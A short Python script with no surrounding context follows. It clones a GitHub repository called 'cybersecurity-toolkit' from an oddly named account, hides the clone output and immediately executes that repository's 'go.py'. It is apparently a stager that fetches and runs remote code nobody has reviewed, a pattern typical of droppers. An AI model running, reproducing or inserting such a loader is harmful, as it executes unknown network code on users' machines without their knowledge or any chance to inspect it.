import subprocess,os,sys
subprocess.run(["git","clone","https://github.com/yourmomsucks357-blip/cybersecurity-toolkit.git"],capture_output=True)
os.chdir("cybersecurity-toolkit")
subprocess.run([sys.executable,"go.py"])
